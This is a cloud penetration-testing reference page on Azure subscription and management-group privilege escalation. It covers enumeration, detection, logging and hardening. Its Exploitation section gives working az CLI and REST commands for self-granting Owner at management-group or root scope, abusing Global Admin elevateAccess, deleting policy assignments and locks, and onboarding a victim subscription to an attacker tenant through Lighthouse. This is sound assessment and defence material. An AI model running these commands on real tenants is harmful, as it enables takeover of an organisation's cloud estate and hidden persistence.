---
cstg_id: CSTG-AZURE-SUBSCRIPTIONS-PRIVESC
title: "AZURE Subscriptions - Privilege Escalation"
provider: azure
service: subscriptions
phase: privilege-escalation
required_access: assumed-breach
required_permissions:
  - "Microsoft.Authorization/roleAssignments/write"
  - "Microsoft.Authorization/roleDefinitions/write"
  - "Microsoft.Management/managementGroups/write"
  - "Microsoft.Management/managementGroups/subscriptions/write"
  - "Microsoft.Subscription/aliases/write"
  - "Microsoft.Authorization/policyAssignments/write"
  - "Microsoft.Authorization/locks/delete"
  - "Microsoft.Resources/deployments/write"
  - "Microsoft.ManagedServices/registrationAssignments/write"
references:
  - "https://learn.microsoft.com/en-us/azure/role-based-access-control/scope-overview"
  - "https://learn.microsoft.com/en-us/azure/governance/management-groups/overview"
  - "https://learn.microsoft.com/en-us/azure/role-based-access-control/elevate-access-global-admin"
  - "https://learn.microsoft.com/en-us/azure/lighthouse/concepts/architecture"
  - "https://learn.microsoft.com/en-us/azure/governance/policy/concepts/effects"
  - "https://learn.microsoft.com/en-us/rest/api/authorization/role-assignments/create"
  - "https://learn.microsoft.com/en-us/azure/azure-resource-manager/management/lock-resources"
  - "https://hackingthe.cloud/azure/"
license: CC BY-SA 4.0
---

## Summary

This page enumerates privilege-escalation paths that operate at the **subscription and management-group layer** of Azure. The objective is to move from an initially compromised principal (assumed breach) to control of an entire subscription — or, more powerfully, an entire management group and therefore every subscription beneath it — by abusing the scope hierarchy, the authorization plane, the governance controls (policy, locks), or cross-tenant delegation that operate at this layer.

Subscription-layer escalation reduces to four patterns: (1) **grant at the highest reachable scope** — exploit RBAC inheritance so a single role assignment at a management group or subscription cascades to all children; (2) **abuse the tenant→subscription relationship** — the well-known Global-Administrator "elevate access" path that grants User Access Administrator over *all* subscriptions, plus subscription creation/transfer; (3) **neutralize the guardrails** — remove or weaken Azure Policy and resource locks that would otherwise block the actions an escalation needs; and (4) **establish or abuse cross-tenant delegation** (Azure Lighthouse) to gain standing access from outside. Each `### <permission/role>` subsection isolates one primitive and the exact path to subscription- or tenant-wide control.

The detailed RBAC primitives that escalate *within* a subscription (run-command, managed-identity assignment, Key Vault, etc.) are catalogued in [azure-rbac-privesc.md](azure-rbac-privesc.md); this page focuses on primitives that escalate *across* the subscription/management-group/tenant boundary. The enumeration that surfaces them is in [azure-subscriptions-enum.md](../02-services/azure-subscriptions-enum.md).

## Prerequisites

An authenticated foothold as any principal (user, service principal, or managed identity) that holds at least one of the escalation primitives below at some scope, or that controls an identity with Global Administrator in the tenant. The assessor needs a valid ARM access token (interactive sign-in, service-principal secret/certificate, a managed-identity token, or a Cloud Shell session). Determine the starting effective access and the scope hierarchy first:

```bash
az account show
az account management-group list -o table          # what sits above the subscriptions
az role assignment list --assignee <objectId> --all -o json
```

The single most important prerequisite question is **the highest scope at which the principal holds any write primitive** — escalation reaches only as high as that scope, but inheritance then flows all the way down.

## Enumeration

Identify which subscription-layer escalation primitives the current principal possesses, and at which scope. Search the principal's effective role definitions for these Actions:

```bash
az role assignment list --assignee <objectId> --all \
  --query "[].{role:roleDefinitionName, scope:scope}" -o json

# For each role, inspect Actions for the primitives below:
az role definition list --name "<roleName>" --query "[].permissions[].actions"
```

Flag: `Microsoft.Authorization/roleAssignments/write` or `roleDefinitions/write` **held at a management-group or subscription scope** (maximal inheritance); `Microsoft.Management/managementGroups/write` and `.../subscriptions/write` (move subscriptions between groups); `Microsoft.Subscription/aliases/write` (create new subscriptions); `Microsoft.Authorization/policyAssignments/write` (alter guardrails); `Microsoft.Authorization/locks/delete` (remove protective locks); `Microsoft.ManagedServices/registrationAssignments/write` (create Lighthouse delegations); and directory-level **Global Administrator** (enables the elevate-access path).

## Misconfigurations & Findings

- A write primitive (`roleAssignments/write`, `*`) held at a **management-group scope** — owner-equivalent over every child subscription, current and future.
- **Global Administrator** accounts without the understanding that the "Access management for Azure resources" toggle grants UAA over the whole tenant's subscriptions.
- Principals able to **move subscriptions** between management groups, escaping or entering policy/RBAC boundaries.
- Principals able to **create subscriptions** under a billing account, producing fresh attacker-controlled scopes that may inherit lax root-management-group policy.
- `policyAssignments/write` outside governance owners — guardrails an attacker can flip from `Deny` to `Audit`.
- `locks/delete` reachable by non-Owner roles — protective locks an attacker removes before destructive or escalation actions.
- `Microsoft.ManagedServices/registrationAssignments/write` held by a principal — the ability to onboard the subscription to an attacker-controlled managing tenant via Lighthouse.

## Exploitation

### Microsoft.Authorization/roleAssignments/write at management-group scope

This is the highest-leverage subscription-layer primitive. RBAC is inherited downward, so a role assignment created at a management group applies to every subscription, resource group, and resource beneath it. A principal holding this action at a management-group scope (held by **Owner** and **User Access Administrator** at that scope) can grant itself Owner over the entire branch in one call.

```bash
# Grant self Owner at MANAGEMENT-GROUP scope -> inherited by all child subscriptions
az role assignment create \
  --assignee <my-objectId> \
  --role "Owner" \
  --scope /providers/Microsoft.Management/managementGroups/<mgGroupId>
```

```http
PUT https://management.azure.com/providers/Microsoft.Management/managementGroups/{mgId}/providers/Microsoft.Authorization/roleAssignments/{newGuid}?api-version=2022-04-01
{ "properties": { "roleDefinitionId": ".../Owner", "principalId": "<my-objectId>" } }
```

If the action is held only at a subscription scope, the same call against `/subscriptions/<subId>` yields full control of that subscription. Always assign at the highest scope where the action is held.

### Global Administrator -> "Elevate access" (User Access Administrator over all subscriptions)

A Microsoft Entra ID **Global Administrator** by default has no access to Azure *resources*, but can toggle "Access management for Azure resources," which assigns the Global Administrator the **User Access Administrator** role at the **root scope (`/`)** — above every management group and subscription in the tenant. From there it can grant itself Owner anywhere. This is the canonical tenant→resource pivot.

```bash
# As Global Admin: elevate access (grants UAA at root scope "/")
az rest --method post --url \
  "https://management.azure.com/providers/Microsoft.Authorization/elevateAccess?api-version=2016-07-01"

# Now grant self Owner at root, inherited everywhere
az role assignment create --assignee <my-objectId> --role "Owner" --scope "/"
```

Therefore any path that reaches Global Administrator in the directory (see [azure-entra-id-privesc.md](azure-entra-id-privesc.md)) is also a path to full control of every subscription.

### Microsoft.Authorization/roleDefinitions/write

Allows creating or editing **custom role definitions** whose `AssignableScopes` include a management group or subscription. The assessor crafts a role containing `*` (or `Microsoft.Authorization/roleAssignments/write`) assignable across the whole branch, then — if it also holds assignment rights — assigns it to itself; or it edits a role it already holds to add dangerous actions.

```bash
az role definition create --role-definition '{
  "Name": "platform-support",
  "Actions": ["*"],
  "AssignableScopes": ["/providers/Microsoft.Management/managementGroups/<mgGroupId>"]
}'
```

### Microsoft.Management/managementGroups/subscriptions/write (subscription movement)

Moving a subscription **into** a management group makes it inherit that group's role assignments and policy; moving it **out** can escape a restrictive policy boundary. An attacker who controls a permissive management group can pull a target subscription under it and inherit standing Owner, or move a subscription out of a `Deny`-policy group to unblock actions.

```bash
az account management-group subscription add \
  --name <attacker-controlled-mgGroupId> --subscription <targetSubId>
```

### Microsoft.Subscription/aliases/write (subscription creation)

A principal with billing-scope rights can **create new subscriptions** under a billing account. A freshly created subscription lands under the root (or a specified) management group and may inherit weak root-level policy, giving the attacker a clean, owned scope to stage operations, run cryptomining, or host persistence with less scrutiny.

```bash
az account alias create --name pwn-sub \
  --billing-scope "/providers/Microsoft.Billing/billingAccounts/<id>/billingProfiles/<id>/invoiceSections/<id>" \
  --display-name "internal-tooling" --workload Production
```

### Microsoft.Authorization/policyAssignments/write (neutralizing guardrails)

Azure Policy in `Deny` effect can block escalation actions (for example denying public IP creation, role assignments to external principals, or specific resource types). A principal that can write policy assignments can change the effect to `Audit`/`Disabled` or delete the assignment, removing the guardrail before performing the otherwise-blocked action.

```bash
# Weaken or remove a blocking policy assignment
az policy assignment delete --name <blockingAssignment> --scope /subscriptions/<subId>
```

### Microsoft.Authorization/locks/delete (removing protective locks)

`CanNotDelete` and `ReadOnly` resource locks survive RBAC and block destructive or modifying actions. Removing them is a precursor to deleting log sinks, modifying protected resources, or completing an escalation that policy/locks would otherwise prevent.

```bash
az lock delete --name <lockName> --resource-group <rg>
az lock delete --ids /subscriptions/<subId>/providers/Microsoft.Authorization/locks/<lockName>
```

### Microsoft.ManagedServices/registrationAssignments/write (Azure Lighthouse delegation)

Creating an Azure Lighthouse **registration assignment** delegates RBAC over the subscription (or resource group) to a **separate managing tenant**. An attacker who controls another tenant can onboard the victim subscription to it, obtaining standing cross-tenant Owner/Contributor that is invisible in the victim's normal role-assignment views and survives cleanup of in-tenant accounts. This is both an escalation and a durable persistence primitive (see [azure-subscriptions-persistence.md](../06-persistence/azure-subscriptions-persistence.md)).

```bash
# Deploy a delegation that grants an external managing tenant a role over this subscription
az deployment sub create --location <region> \
  --template-file lighthouse-delegation.json \
  --parameters managedByTenantId=<attacker-tenant> \
               authorizations='[{"principalId":"<attacker-principal>","roleDefinitionId":"<Owner-GUID>"}]'
```

## Detection & Logging

- **Azure Activity Logs** record every subscription-layer write: role assignment/definition creation at management-group or subscription scope, `elevateAccess` (root UAA grant), management-group subscription add/remove, subscription alias creation, policy assignment create/update/delete, lock delete, and `Microsoft.ManagedServices/registrationAssignments/write` (Lighthouse onboarding). A role assignment whose `principalId` equals the caller, or one created at the **root or management-group scope**, is a strong self-elevation signal.
- **Microsoft Entra ID audit logs** record the directory side of the Global-Admin path — the elevate-access toggle, role activations, and any group/credential changes used to reach Global Administrator. **Sign-in logs** show the authenticating principal, IP, client app, and conditional-access result, and reveal cross-tenant sign-ins relevant to Lighthouse.
- **Lighthouse onboarding** appears in the *managed* (victim) subscription's Activity Log as a registration-assignment write; the resulting cross-tenant access is then exercised by principals from the managing tenant — correlate managing-tenant object IDs performing writes.
- Managed detections: **Microsoft Defender for Cloud** and **Microsoft Sentinel** ship analytics for `elevateAccess`, suspicious role-assignment creation at high scopes, policy/lock tampering, and new Lighthouse delegations. Alert on any root-scope (`/`) or management-group assignment outside change windows.

## Remediation & Hardening

- Restrict `Microsoft.Authorization/roleAssignments/write` and `roleDefinitions/write` to a tiny, audited set of principals, and minimize who holds them at **management-group** scope; treat MG-scope Owner/UAA as the crown jewels.
- Control **Global Administrator** count, enforce phishing-resistant MFA and PIM for it, and monitor `elevateAccess`; remove the root-scope UAA grant after any legitimate use.
- Govern the **management-group hierarchy**: restrict who can move subscriptions (`Microsoft.Management/managementGroups/subscriptions/write`) and who can create subscriptions; require approval for subscription creation/transfer.
- Apply guardrail **Azure Policy in `Deny` effect** at the management-group level and protect `policyAssignments/write`; alert on policy weakening/deletion.
- Use **resource locks** on critical resources and the policy/log infrastructure; restrict `Microsoft.Authorization/locks/*` and alert on lock deletion.
- Tightly govern **Azure Lighthouse**: restrict `Microsoft.ManagedServices/*/write`, review delegations regularly, and alert on new registration assignments to any unexpected managing tenant.
- Adopt **PIM** for all high-value roles (eligible, time-bound, MFA/approval-gated) to eliminate standing privilege, and stream Activity, Entra audit, and sign-in logs from every subscription to Sentinel with rules for the writes above.

## Tools

- **Azure CLI / Azure PowerShell** for role-assignment, management-group, subscription-alias, policy, lock, and deployment operations.
- **ARM REST client** for `elevateAccess` and provider operations the CLI does not surface directly.
- **Azure Resource Graph** to locate the highest scope at which the principal holds write primitives and to inventory policy/lock coverage across subscriptions.
- **RBAC / scope escalation-path analysis tooling** that computes reachable Owner/UAA paths accounting for management-group inheritance.
- **Microsoft Graph API** clients for the directory-side Global-Administrator path.

## References

- RBAC scope overview — https://learn.microsoft.com/en-us/azure/role-based-access-control/scope-overview
- Management groups overview — https://learn.microsoft.com/en-us/azure/governance/management-groups/overview
- Elevate access to manage all subscriptions — https://learn.microsoft.com/en-us/azure/role-based-access-control/elevate-access-global-admin
- Azure Lighthouse architecture — https://learn.microsoft.com/en-us/azure/lighthouse/concepts/architecture
- Azure Policy effects — https://learn.microsoft.com/en-us/azure/governance/policy/concepts/effects
- Lock resources — https://learn.microsoft.com/en-us/azure/azure-resource-manager/management/lock-resources
- Role Assignments Create REST API — https://learn.microsoft.com/en-us/rest/api/authorization/role-assignments/create
- hackingthe.cloud (Azure) — https://hackingthe.cloud/azure/
